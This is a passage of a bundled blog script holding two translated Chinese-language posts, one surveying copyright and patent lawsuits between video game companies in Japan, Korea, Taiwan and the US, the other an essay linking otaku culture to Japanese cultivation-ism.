faire），則是指在某一特殊的創作類型、文體、主題或概念上，一定要使用某種表達方式，才能讓他人知道是這種文體或主題。因此，若為了表達該創作文體或主題一定要使用的表達方式，也不受著作權法保護。</p>\n<p>（前略）Wolfson 法官認為，雖然著作權法不保護某些著作的功能面向，但這並非表示，與遊戲的規則、功能有關的任何表達，均不受著作權法保護。畢竟，一個遊戲的所有表達元素，一定某程度會與該遊戲的規則或功能面向有關。因此，法官認為，原告 Tetris Holding 對該遊戲所選擇的表達遊戲規則的方式或遊戲進行的方式，就是在對概念選擇某種表達方式（註 11）。（中略）「俄羅斯方塊」是一個人為創造出來的遊戲，而非要模仿真實世界，因此，被告並不能主張，為達到該遊戲規則或功能只有唯一或有限的表達方式，而須援用必要場景原則（註 15）。</p>\n<p>（前略）若沒有明確告訴讀者，一般人應該無法分辨到底哪一個畫面屬於哪一個遊戲。一般人略微看過後，應該會覺得兩者很可能構成實質近似（substantially similar）。若再看整個遊戲畫面的進行，更會得到一個結論，就是這二個遊戲根本一模一樣。Wolfson 法官認為，由於這兩個遊戲的視覺表達太過接近，可以說類似於「逐字抄襲」（literal copying）的程度。當然，由於被告 Xio 並沒有抄襲原告的程式碼，故並不是真的構成逐字抄襲，但 Xio 並沒有否認，其幾乎抄襲了所有俄羅斯方塊的視覺畫面（註 17）。</p>\n<h2 id=\"5-2012-年-日本-gree-《釣り-★-スタ》-控訴-dena-《釣りゲータウン２》-敗訴\">5. 2012 年 日本 GREE 《釣り ★ スタ》 控訴 DeNA 《釣りゲータウン２》 敗訴</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.soei.com/blog/2014/08/30/%E8%91%97%E4%BD%9C%E6%A8%A9%E3%80%8C%E9%87%A3%E3%82%8A%E3%82%B2%E3%83%BC%E3%83%A0%E4%BA%8B%E4%BB%B6%E3%80%8D%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6/\">著作権「釣りゲーム事件」について</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/QCVJcKA.jpg\" alt=\"pic 9\"></p>\n<h3 id=\"1-事件概要\">1. 事件概要</h3>\n<p>平成 24 年 2 月 23 日，東京地裁一審判決「DeNA 的釣魚遊戲侵害了 GREE 的釣魚遊戲的著作權（改作權、公眾傳輸權）」（平成 21 年 (ワ) 第 34012 號）。</p>\n<p>平成 24 年 8 月 8 日，智財高院二審推翻了一審的判決，認為「DeNA 的釣魚遊戲並沒有侵害 GREE 的釣魚遊戲的著作權」。可說是 DeNA 的逆轉勝訴。</p>\n<h3 id=\"2-改作上的判斷相左\">2. 改作上的判斷相左</h3>\n<p>一審中經由對比兩造的釣魚遊戲畫面後，認為 DeNA 侵害了改作權。</p>\n<blockquote>\n<p>「…雖說共通部份的元素屬平凡且隨處可見之物，仍難以說其不具有創作性。」</p>\n<p>「…即使總合檢討相異點，被告作品的魚隻上勾畫面與原告作品的魚隻上勾畫面在表現上具有本質性的特徵同一性，因此可認為接觸被告作品的魚隻上勾畫面的使用者，即使其中具有上記的相異點，仍然會感受到其與原告作品的魚隻上勾畫面所具有的表現上的本質性特徵。」</p>\n</blockquote>\n<p>而二審與一審同樣比對兩者的釣魚遊戲畫面後，判斷 DeNA 並沒有改作 GREE 的釣魚遊戲。</p>\n<blockquote>\n<p>「被告作品僅是在畫面的轉換以及素材的選擇、排列，這類點子的表現和具有表現上的原創性之外的部份和原告作品具有同一性，而接觸者並無法直接從原告作品的畫面轉換或是素材的選擇、排列的表現感受到本質性的特徵，因此並不符合改作。」</p>\n</blockquote>\n<p>兩次法庭的判斷，都可認為是依循江差追分事件（最判 H13.6.28）案例中的判斷。</p>\n<h3 id=\"［江差追分事件中的判斷］\">［江差追分事件中的判斷］</h3>\n<p>（1）進行新的著作物創作行為時，依附於既有的著作物，</p>\n<p>（2）以及，與其在表現上具有本質性的特徵同一性，</p>\n<p>（3）透過具體的修正、增減、變更表現後，於創作性上表現出新的思想或感情，</p>\n<p>（4）讓接觸者會直接感受到存在其中的，既有的著作物在表現上的本質特徵。</p>\n<p>（5）進行著作物創作行為時，若其是在思想、感情或點子、事實或事件這類並非表現本體的部份，或是在表現上不具有創作性的部份，與既有的語言創作物具有同一性時，並不會造成侵害既有著作物的改作權。</p>\n<p>在一審中判斷此案例滿足了（1）～（4）的要件（為改作），二審則和江差追分事件相同以（5）為主要理由判斷此案「不是改作」。</p>\n<h2 id=\"6-2013-年-日本-konami-《プロ野球ドリームナイン》-控訴-gloops-《大熱狂！！プロ野球カード》-部份勝訴\">6. 2013 年 日本 Konami 《プロ野球ドリームナイン》 控訴 gloops 《大熱狂！！プロ野球カード》 部份勝訴</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.intx.co.jp/%E3%83%97%E3%83%AD%E9%87%8E%E7%90%83%E3%83%89%E3%83%AA%E3%83%BC%E3%83%A0%E3%83%8A%E3%82%A4%E3%83%B3%E4%BA%8B%E4%BB%B6/\">プロ野球ドリームナイン事件</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/3dAUpBS.jpg\" alt=\"pic 10\"></p>\n<p>原告 X 為科樂美數位娛樂有限公司，被告 Y 為 gloops 有限公司。</p>\n<p>（中略）</p>\n<p>平成 9 年 20 日，原告 X 以下述主張提出了訴訟：</p>\n<p>１）Y 複製亦或改作了 X 的遊戲，並自動傳播給公眾，侵害了 X 的著作權（複製權、改作權、公眾傳播權）。</p>\n<p>２）X 遊戲的影像與構成是眾所皆知或著名的商品顯示之形態，Y 的遊戲構成了不當競爭防止法中的不當競爭 。</p>\n<p>３）基於著作權法第 112 條第 1 項以及不當競爭防止法第 3 條，要求 Y 的遊戲停止散佈（公眾傳播、傳輸可能化）。</p>\n<p>４）基於侵害著作權以及不當競爭防止法第 4 條，要求賠償 5595 萬 1875 圓的損害額，以及訴訟費用的 260 萬圓，和預備支付的延遲損害額。</p>\n<p>５）由於 Y 所施行的 Y 遊戲提供、散佈，造成 X 提供、散佈 X 遊戲時的損失，基於此要求 Y 針對此不法行為賠償 1716 萬 4696 圓以及延遲損害額。</p>\n<p>一審東京地方法院第 40 部東海林保法官，審理下列爭點與進行判斷，卸下了原告的所有主張。</p>\n<ol>\n<li>爭點（１）（中略）判決中講到（被告的）「中島選手和達比修選手的卡片在姿勢和構圖上，都與原告遊戲極為相似」，但認為「『原告遊戲和被告遊戲』雖然在『選手卡片』上具有共通點，其共通部份屬常見的表現亦或是不具有創作性的表現，因此並不符合改作行為」。</li>\n<li>爭點（２）由於原告遊戲並非「眾所皆知或著名的商品顯示影像」，不構成理由。</li>\n<li>爭點（３）X 所主張的原告遊戲中的五種要素的畫面顯示組合，並不符不當競爭防止法第 2 條 1 項 3 號所指的「形態」。</li>\n<li>爭點（４）引用最高法院於平成 23 年 12 月 8 號的判決（北朝鮮電影事件），認為被告的遊戲散佈行為不構成不法行為。</li>\n</ol>\n<p>X 提出上訴。</p>\n<p>二審智財高院第 1 部設樂隆一法官判決「被告人 Y 遊戲的選手卡片裡的中島選手和達比修選手的卡片，侵害了告訴人 X 遊戲的選手卡片的著作權（改作權、公眾播送權），因此必須支付賠償金額」。</p>\n<p>而賠償金額的部份，Y 在修改選手卡片的表現之前的 9 天內，於遊戲內販賣稀有卡包所得到的利益為 1541 萬 5312 圓。</p>\n<p>而本案中的 2 張選手卡片於稀有卡包的販售利益中的佔額為此次侵害著作權的行為中 Y 所得到的利益。「可認為前述的稀有卡包的販售利益中最低有 8%，為本案販售這兩位選手卡片時所獲得的利益」</p>\n<p>因此根據著作權法 114 條 2 項推算 X 所受到的損害金額為 123 萬 3225 圓（1541 萬 5312 圓 x 0.08）。</p>\n<p>然而根據著作權法第 114 條 2 項的「推定覆滅事由」，即使未發生 Y 的著作權侵害事件，X 並不會因此獲得更多遊戲內稀有卡包（選手卡片）所獲得的販售利益。</p>\n<p>「無法計進 X 透過販賣稀有卡包可獲得的利益比例至少有 90%」</p>\n<p>「本案告訴人於選手卡片的著作權侵害上所受的損害額為，12 萬 3322 圓（123 萬 3325 圓 x 10%）」。</p>\n<p>律師費用約莫 20 萬圓。</p>\n<p>判決主文：</p>\n<p>１）原判決改為下述內容。</p>\n<ol>\n<li>被告人應向告訴人支付 32 萬 3322 圓，其中 12 萬 3322 圓應於平成 23 年 9 月 21 日前，20 萬應於平成 24 年 2 月 21 日前向告訴人支付完畢。</li>\n<li>告訴人放棄其餘主要與預備的要求。</li>\n</ol>\n<p>２）第 1 審與第 2 審的訴訟費用以 100 等份，其之 1 由被告負擔，剩餘由告訴人負擔。</p>\n<h3 id=\"7-2015-年-韓國-king-digital-《rarm-heroes-saga》-控訴-avocado-《forest-mania》-勝訴\">7. 2015 年 韓國 King Digital 《Rarm Heroes Saga》 控訴 Avocado 《Forest mania》 勝訴</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://hanyanglaw.com/jpn/sub4/newsletter_view.asp?ListNumber=271\">モバイルゲームのルール・表現方式の類似は、著作権侵害（大法院 2019.7.1 言渡 2017Da212095 判決）</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/xRjKTTC.png\" alt=\"pic 11\"></p>\n<h4 id=\"（１）地方法院的判決\">（１）地方法院的判決</h4>\n<p>地方法院認為 Froest mania 並沒有侵害 Farm Heros Saga 的著作權。然而兩款遊戲在規則與進行方式上都有類似之處，法院認為 Forest mania 有違反不當競爭防止法之處，判決要求賠償 11 億 6811 萬韓元（約 1 億 84 萬日圓）。</p>\n<h4 id=\"（２）高等法院的判決\">（２）高等法院的判決</h4>\n<p>二審中認為此案並無違反著作權法、不當競爭防止法、民法中的不法行為，棄下了原告的所有要求。</p>\n<h4 id=\"（３）大法院的判決\">（３）大法院的判決</h4>\n<p>（甲）在此次審判中，King.com 所開發的遊戲是否能做為具有創作性的著作物受到保護，以及 Avocado Entertainment 的遊戲是否具有實質上的類似點成為爭點。</p>\n<p>（乙）裁決團做出說明：「King.com 所開發的《Farm Heros Saga》是基於遊戲開發者累積至今的遊戲開發經驗與知識，選擇遊戲中所必要的要素，將技術性具現化於於主要構成要素的選擇和配置，以及達成有機的配置，使其能得出與先行遊戲具有明確區別的創作性個性，因而得以成為著作物的保護對象」。</p>\n<p>（丙）並且指摘了：「Avocado Entertainment 的遊戲，直接包含了 King.com 的製作意圖與劇本技術性具現化於主要構成要素的選擇和配置、有機性的組合所達成的創作性表現形式，因此兩款遊戲具有實質上的類似性」。</p>\n<h2 id=\"8-2016-年-台灣《武林群俠傳》-控訴-中國《俠客風雲傳》-勝訴\">8. 2016 年 台灣《武林群俠傳》 控訴 中國《俠客風雲傳》 勝訴</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.tiplo.com.tw/jp/news_in.aspx?mnuid=1327&amp;nid=1958\">智冠「武林群俠傳」を剽窃、コンピュータゲーム会社に 2400 万新台湾ドルの賠償命令判決</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.tiplo.com.tw/tw/tn_in.aspx?mnuid=1221&amp;nid=46699\">侵害著作權 電玩遊戲業者判賠 2400 萬元</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/DbN3xQr.jpg\" alt=\"pic 12\"></p>\n<p>徐男辯稱，「俠客風雲傳」推出時，電玩雙週刊以「新武林群俠傳」作為遊戲宣傳，可見智冠科技早知該遊戲呈現樣貌，且該遊戲光碟、說明書及包裝盒也是智冠科技代製，但智冠科技卻遲至 2017 年 6 月才提訟，已超過 2 年損害求償時效，刑事部分也不起訴。此外，「俠客風雲傳」的劇情、角色、人物對話等都比「武林群俠傳」豐富，並未侵權。</p>\n<p>智財法院調查後認為，2 款遊戲角色造型或性格、事件劇情、場景、人物對話內容、武功招式、甚至武器等都極為相似，認定河洛遊戲公司侵害智冠科技著作權，考量河洛遊戲公司推出「俠客風雲傳」共獲利 4859 萬餘元及雙方經銷約定的利益分配，判決河洛遊戲公司及徐姓負責人須賠償智冠科技 2400 萬元。（2019.03）</p>\n<h2 id=\"9-（進行中）2012-年-日本-sega-控訴-level-5-《閃電十一人》系列作品侵害操控專利\">9. （進行中）2012 年 日本 Sega 控訴 Level 5 《閃電十一人》系列作品侵害操控專利</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.4gamer.net/games/063/G006301/20121212090/\">レベルファイブ，セガとの特許問題についての公式見解を発表</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://techvisor.jp/blog/archives/2876\">セガのサッカーゲーム特許訴訟について</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/klFQNvF.png\" alt=\"pic 13\"></p>\n<p>Sega 公司於 2012 年控訴 Level 5 公司侵害了其於 2009 年 2 月 20 日 和 2011 年 8 月 26 日所通過的專利，具體為特願 2004－381199 號和特願 2008－275989 專利。</p>\n<p>對此 Level 5 公司的回覆為「在觸控螢幕已經普及的現在使用觸控筆操控角色是極為基本的操作」，認為 Sega 公司的控訴是不合理的。</p>\n<p>然而本案至今（2020 年）似乎仍在纏鬥中，並未得出判決。</p>\n<h2 id=\"10-（進行中）2018-年-日本-任天堂控訴可樂噗《白貓-project》無斷使用操控專利\">10. （進行中）2018 年 日本 任天堂控訴可樂噗《白貓 Project》無斷使用操控專利</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://toyokeizai.net/articles/-/221979\">任天堂も動いた！変わるゲームの｢特許事情｣ ｢パクり合い｣に寛容な時代はもう終わった</a></li>\n</ul>\n<p><img src=\"https://i.imgur.com/14EdwTr.png\" alt=\"pic 14\"></p>\n<p><img src=\"https://i.imgur.com/Uv2LvQc.jpg\" alt=\"pic 15\"></p>\n<p>遊戲業界內有許多對於這次訴訟感到驚訝的意見，因為這是任天堂第一次在國內以侵害專利權為根據提起訴訟。</p>\n<p>（中略）專利權和著作權同樣是企業所擁有的智慧財產，但在遊戲業界裡鮮有積極行使專利權的企業。曾任 Capcom 專利團隊領導的，優專利事務所的田嶋諭律師便說「我們會做水面下程度的警告，但沒有到特別過頭的狀況，則不會演變為訴訟」，並也認為任天堂是在行使專利權上較為消極的公司之一。</p>\n<p>（中略）任天堂對此的說明是，「我們已經花了相當長的時間與對方交涉關於侵害專利權的事情，但仍無法達成共識。言盡於此」。實際上這兩家公司開始協議是 2016 年 9 月的事，經過了超過 1 年以上的交涉才走到提告。而可樂噗的說明亦大致相同。</p>\n<p>（中略）任天堂需要證明「《白貓》的機能滿足了所有的證明要件」，而可樂噗需要證明「有一處與構成要件不同的部份存在」，或是「存有專利權無效的要素」其中一者。</p>\n<p>審判至今仍在進行中，預測是東京地院的判決會在 1~2 年後出爐。（中略）不論這次案件的結果如何，往後各家遊戲公司都會有必要更慎重地開發遊戲。一位業界關係人士便說：「以前的遊戲開發圈有著『抄別人的遊戲來開發是理所當然的。把各家的優點抄過來才會做出更有趣的遊戲，讓業界整體更加興隆』的潮流，但現在已經不是這樣的時代了」。</p>\n<p>但目前遊戲相關的專利數量也已多不勝數，之後只會更多。想完全避開這些專利也會縮限遊戲開發的空間。田嶋便指摘：「除了回避其他公司的專利外，建立起能容易利用這些專利的環境也很重要。而像是互相允許使用專利的『Cross License』或多家公司手持專利組成共同體，讓允諾專利作業能一次化的『Patent Pool』，這些作法雖然難以一次套用到所有的專利，亦是可活用的有效手段」。</p>\n<h2 id=\"和解例\">和解例</h2>\n<h3 id=\"2008-年-韓國-konami-控訴-pentavision-《djmax》-侵害音樂遊戲專利權\">2008 年 韓國 KONAMI 控訴 PENTAVISION 《DJMAX》 侵害音樂遊戲專利權</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gnn.gamer.com.tw/detail.php?sn=34255\">韓國 KONAMI 控告《DJMAX》系列開發公司 PENTAVISION 侵權</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://bm2dx.com/!/-/177/\">【DJMAX】コナミがペンタを訴えたのを覚えていますか？</a></li>\n</ul>\n<p>PENTAVASION 最後以交附《DJMAX》在日本的經銷權給 KONAMI，雙方達成和解。</p>\n<h3 id=\"2018-年-美國-pubg-corporation-《playerunknowns-battlegrounds》-控訴-netease-games-《荒野行動--knives-out--》\">2018 年 美國 PUBG Corporation 《PLAYERUNKNOWN&#39;S BATTLEGROUNDS》 控訴 NetEase Games 《荒野行動- Knives Out -》</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.4gamer.net/games/348/G034868/20180427039/\">裁判に持ち込まれる「バトルロイヤル」ゲームと，ゲーム業界における知的財産の意味</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gnn.gamer.com.tw/detail.php?sn=162254\">以將在法庭見真章的「大逃殺式」遊戲 論智慧財產權在遊戲界的意義</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.4gamer.net/games/348/G034868/20190326065/\">「PUBG」が「荒野行動」を訴えた裁判が，両社の和解で終了するも和解内容については不明</a></li>\n</ul>\n<p>PUBG Corporation 於 2018 年以侵害著作權、不當競爭向 NetEase 提起訴訟，雙方於 1 年後達成和解，和解內容不明。</p>\n<h2 id=\"其它相關法律事例與資料\">其它相關法律事例與資料</h2>\n<h3 id=\"外観的に侵害が立証可能なソフトウェア特許を。とあるゲーム企業の実体験\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.logic-meister.com/blog/18\">外観的に侵害が立証可能なソフトウェア特許を。とあるゲーム企業の実体験</a></h3>\n<p>A 公司為了準備訴訟與律師討論後，\n得到了『要有能證明競品侵害專利的資料』的意見。</p>\n<p>然而這份專利是『僅限定於內部程式運作部份』的申訴用途。\n想要舉證侵害此專利，就得先拿到競品的程式資訊。</p>\n<p>但要破解競品調查程式也有資料保護上的問題，\n即使拿到了程式碼，要解析極龐大的程式資料，\n去除雜訊後，特定出能證明侵權的部份，\n在各種限制下都是相當困難的。</p>\n<p>因此雖然 A 公司取得了專利，最後仍得放棄行使權利。</p>\n<h3 id=\"台灣：抄之有道，更不要怕被抄，害怕也沒用-─-聽-belp-談山寨的界限在哪裡上\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20151021034240/http://punnode.com:80/archives/13559\">台灣：抄之有道，更不要怕被抄，害怕也沒用 ─ 聽 BELP 談山寨的界限在哪裡(上)</a></h3>\n<p>APP 抄什麼？</p>\n<ol>\n<li>著作權：APP 的美術設計及程式碼</li>\n<li>專利權：APP 的技術</li>\n<li>商標權：APP 名稱及 LOGO</li>\n<li>營業秘密：APP 不可讓他人知道的事，例如程式碼，演算法</li>\n<li>公平交易法：APP 整體的設計及給消費者的感受（表徵）</li>\n</ol>\n<h3 id=\"台灣：app-沒有你想的那麼簡單-─-聽-belp-談山寨的界限在哪裡下\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://web.archive.org/web/20150904215509/http://punnode.com/archives/13578\">台灣：APP 沒有你想的那麼簡單 ─ 聽 BELP 談山寨的界限在哪裡(下)</a></h3>\n<p>為什麼龍族拼圖不告神魔之塔？</p>\n<p>「我們都知道神魔之塔是抄龍族拼圖的，他們在初期甚至完全一樣，那為什麼龍族拼圖不告？」，這個問題引發了全場的思考，我們都說他們二個遊戲完全一樣，那一樣在哪？Ant 提出幾個會侵權的「一樣」：</p>\n<ol>\n<li>文字一樣？（著作權法）</li>\n<li>圖片一樣？（著作權法）</li>\n<li>音樂一樣？（著作權法）</li>\n<li>排版一樣？（專利權法）</li>\n<li>公司名稱及圖示一樣？（商標權法）</li>\n<li>遊戲玩法一樣？（專利權法）</li>\n<li>竊取商業機密？（營業秘密法）</li>\n<li>用戶混淆？（公平交易法）</li>\n</ol>\n<p>從這裡我們就可以發現，其實神魔做了很多「小」改變，他重畫、重選音樂……就是這些小改變，那他和龍族拼圖「不一樣」。</p>\n<p>只要後起者重新做，就算起點一樣，做出來的東西如果能有不同之處就可以繼續做。不過如果已經相似到會混淆到了消費者的基本認知，或是有偷圖、偷文的行為（從公平交易法角度出發），就像 Mino 對 Tetis 在俄羅斯方塊中地位的直接取代，直接造成消費者無法辨識兩者，那才會侵權。</p>\n<hr>\n<h2 id=\"其它參考資料\">其它參考資料</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://tyosaku.hanrei.jp/tree/cr/cr/1-7-1/page1.html\">著作権判例データベース</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.ben.li/article/copyright/history_of_game_problem.html\">コンピューター・ゲームと著作権</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.softic.or.jp/YWG/reports/sankou2.html\">コンピュータ・ゲームに関する判決</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://patent-law.hatenablog.com/entry/2019/11/10/012316\">特許法 101 条 4 号による間接侵害成立の妥当性 ― カプコン v. コーエーテクモゲームス事件控訴審判決</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ol.gamersky.com/news/201912/1251594.shtml\">网络游戏直播的法律边界 — — 《梦幻西游 2》直播案一审判决评析（中國網站）</a>（中國網站）</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ol.gamersky.com/news/201912/1251594.shtml\">《梦幻西游》直播侵权案维持原判 网易获赔 2000 万元（中國網站）</a>（中國網站）</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://zhuanlan.zhihu.com/p/99674238\">要案速递| &quot;梦幻西游&quot; 网络直播侵权案二审落幕 维持原判（中國網站）</a>（中國網站）</li>\n</ul>\n","date":"2020-10-16T05:07:16.000Z","excerpt":"","printDate":"October 16, 2020","printReadingTime":"5 min read"};

var route_32 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod13
});

var Mod14 = {"title":"【譯】做為「教養主義」亡靈的「御宅族」—為了自省的「御宅」論","slug":"ACG-ghost-of-upbringing-doctrine-otaku","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://amberfeb.hatenablog.com/entry/2013/12/29/001526\">「教養主義」の亡霊としての「オタク」―自省のための「オタク」論</a></p>\n<hr>\n<p>我在前幾天看完了竹內洋的書《教養主義的沒落》。<strong>「教養主義」</strong>曾經在明治時期至 1960 年代後半，在大學這一類的高等教育領域中<strong>擁有巨大的影響力</strong>。這本書講述了這段經歷的開始、變質，以及走向沒落的過程，非常有意思。</p>\n<p>所謂的「教養主義」的思想，簡單來說就是為了人格養成、改良社會，應該重視讀書，並且讀書應是大學生活「正確」的形式，而這種思想隨著逐漸轉變的日本社會一同經歷了變化，並以<strong>必然性的歸結走向了結束</strong>。</p>\n<p>然而我認為，有一部份的「教養主義」<strong>仍然存在於日本裡</strong>。在現代的日本裡，是什麼樣的人們仍然讓我們感受到「教養主義」的殘存？那就是<strong>人稱「御宅族」的人們</strong>。在此，我想要從「教養主義」的角度來思考「御宅族」。</p>\n<h2 id=\"說來「御宅族」究竟是何人\">說來「御宅族」究竟是何人</h2>\n<p>既然方才提到了「御宅族」，我最好先講明「御宅族」究竟是何人。然而要定義「御宅族」相當困難。至今已有許多研究者從各種不同的角度替「御宅族」做出定義，對於不同的人來說「御宅族」也帶有不同的印象。這點從最近由插畫家安田朗談論「御宅族」所引起的熱烈議論中也能看出。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://togetter.com/li/604251\">あきまん氏が語るオタク論！人生で「自分の好きなモノ」を理解する重要性とは？</a></p>\n<p>但若不定義「御宅族」，就沒辦法繼續談下去，所以就以我的感覺來說。<strong>以下所講的「御宅族」這個詞彙，是指十分熱中沉迷於某種興趣裡的人</strong>。不論這興趣是動畫、漫畫、鐵路或是音樂。</p>\n<p>這種曖昧而廣泛範圍的定義是有理由的。因為不論是哪種興趣，在這群熱中於興趣的人們裡，都能看見有和過往「教養主義」者相似的機制存在。這種機制，也應該不是只為動畫御宅族或鐵道御宅族所獨有。而是在各種興趣領域中有深切涉略的人們之間共通擁有的。這是曖昧定義的理由。</p>\n<p>而這只是我個人的想法，各位要如何解讀也是自由的，我也認為對「御宅族」做出明確定義這件事是沒有意義的。這只是為了表明在這篇文章裡，我會以上述的定義使用「御宅族」這個詞彙。以及為了表明在文章後半段，主要的談論對象會變為動畫御宅族。但我自己所想論述的是普遍的「御宅族」。</p>\n<h2 id=\"教養主義的其中一面「象徵性的暴力」與「修養主義」\">教養主義的其中一面—「象徵性的暴力」與「修養主義」</h2>\n<p>既然我們已經做出了「御宅族」的定義，我想對「教養主義」究竟是什麼東西及其特徵做確認。在竹內的書中寫到了教養主義的各種面向，我想取其中兩點來做介紹。第一個是「象徵性的暴力」，第二個是「修養主義」。</p>\n<h2 id=\"教養主義的「象徵性暴力」\">教養主義的「象徵性暴力」</h2>\n<p>教養主義的「象徵性暴力」所指為何？這是引用於『教養主義的沒落』裡，和辻哲郎的對話形式散文的主要觀點。以下二次節錄自和辻與青年對話的部份。</p>\n<blockquote>\n<p>「你不懂得該如何培育自己。為了創造出鉅作，你必須讓自己茁壯。（中略）捨棄掉那些你自以為的渺小驕傲。（中略）持續注視那些巨大的存在。（中略）這世界上有著反覆看上數百遍仍顯不足的傑作。你要記住自己屈於這些存在之前的樣貌。從那些愚蠢的大眾得來的成功根本不算什麼。只是讓你也跟著變成笨蛋而已。」</p>\n<p>竹内洋「第 1 章 エリート学生文化のうねり」《教養主義の没落》ｐ 54</p>\n</blockquote>\n<p>和辻想讓青年「屈從」於書籍之下。<strong>累積有更多學識之人所行使的「教養」，欲使並非如此之人感到劣等感，並因此屈服</strong>。竹內將此稱為象徵性的暴力。</p>\n<h2 id=\"教養主義所持有的「修養主義」的一面\">教養主義所持有的「修養主義」的一面</h2>\n<p>第二點的「修養主義」則相當容易理解。修養即是修身養性。也就是透過教養鍛練自己的思想。我認為這兩者的特徵相當顯著地為現代的「御宅族」所繼承。</p>\n<p>例如電影御宅族，如果沒有看過往年的名作，就會遭到類似「你居然沒有看過那部作品」的，象徵性的暴力。這在動畫和音樂上也可說是如此。</p>\n<p>為了不受人如此責備，就必須要以同於「修養主義」的想法，尋求探訪過去的名作、名盤，鍛練自己。我想會自認是「御宅族」的人，都曾有過這樣的經驗。有本書寫到，擁有「御宅族」的特徵或是氣質的人，被人說「你知道得真多呢」，都會回答類似「不不，我不知道的還很多」的話，我認為這正是屬於修養主義的想法。</p>\n<h2 id=\"「御宅族」的「教養主義」已死？\">「御宅族」的「教養主義」已死？</h2>\n<p>除了我以外，在網路上也有許多提到「御宅族」與「教養主義」之間的關聯的人。然而令我意外的是，我所找到的都是想法類似「御宅族的教養主義已死」的文章。去 Google 搜尋優先顯示的也都是這類形的文章。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://ch.nicovideo.jp/cayenne3030/blomaga/ar197249\">オタクにとっての「教養」は崩壊した。次は「常識」がなくなるだろう。（2124 文字）</a></p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://togetter.com/li/175173\">アニメオタクの教養とか知識とか経験とか</a></p>\n<p>雖然這些文章僅以輕小說和動畫御宅族作為討論對象，我認為他們所說的也有道理。但真的是如此嗎，「御宅族」的教養主義也走向了沒落的過程嗎。</p>\n<p>我認為沒有。確實在消費者的身上已經看不到「教養主義」的態度。但我認為正是因為如此，「御宅族」的「教養主義」的一面反而變得更加強烈。最好的例子就是「跟風御宅」這一類稱呼的出現。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://matome.naver.jp/odai/2137905780638948201\">【注目】最近増えているにわかオタクとは？？</a></p>\n<p>這篇文章裡的「跟風御宅」的定義極為模糊，並不重要。應當著眼的點是，「跟風御宅」這個稱呼裡所含有的，侮辱性的意涵。稱呼人為「跟風御宅」正是過去的教養主義的特徵，是體現了象徵性的暴力的詞彙。也就是說，動畫御宅族在已然大眾化的動畫文化裡，透過墮落的形式讓這種教養主義性的想法展露並傳承下去。</p>\n<h2 id=\"「御宅族」該如何存在「教養」的正確使用方式\">「御宅族」該如何存在—「教養」的正確使用方式</h2>\n<p>我認為該如何看待「御宅族」展現的這種態度是個人的自由。試圖以「跟風」去凸顯差別，並肯定地坐居於教養主義的象徵性暴力之上，也是個人的自由。但是，這種把「跟風御宅」當成笨蛋的潮流，我個人是無法茍同。</p>\n<p>老實說，我也不敢說自己從沒把「跟風御宅」當成笨蛋過。去年《JOJO 的奇幻冒險》開始播映後的時候，我的身邊越來越多沒有看過原作而在說著「JOJO 超有趣的——wwwww」的傢伙，講真的，非常地令人厭煩。打從心底希望這些傢伙去看原作。</p>\n<p>但仔細想想，每個人一開始都是「跟風仔」。打從出生就是「御宅族」的人並不存在。即使對於動畫非常地熟稔，也不見得在其他事情上亦是如此。如果對其他事物產生興趣了，就只能成為那個領域的「跟風仔」來入門。</p>\n<p>至今所說的都是屬於教養主義負面角度的部份。但是，「教養」只存在不好的一面嗎？不，並非如此。竹內也以前尾繁三郎這位人物為例，舉出了一種「教養」應當抱有的存在方式。</p>\n<blockquote>\n<p>對於前尾來說，教養當然不是種用來「誇耀」（展現差異）用的東西，也絕不是為了能「得利」（功成名就）的東西。而是與自己戰鬥，偶爾被周圍的人疏遠，使得自己的存在顯得危惧，「打擾他人」的東西。</p>\n<p>竹内洋「終章 アンティ・クライマックス」《教養主義の没落》ｐ 244</p>\n</blockquote>\n<p>「教養」不是為了展現差異或功成名就，而是為了自省所追求的。這樣的「教養」才會開始發揮其真正的價值吧。像是讓「御宅族」保持其謙虛的限制，正就是教養。並且能夠跨越「跟風御宅」與「御宅族」之間的橫溝。我認為這才正是「御宅族」應當抱有的存在方式。</p>\n","date":"2019-09-20T19:12:25.000Z","excerpt":"","printDate":"September 20, 2019","printReadingTime":"1 min read"};

var route_11 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod14
});

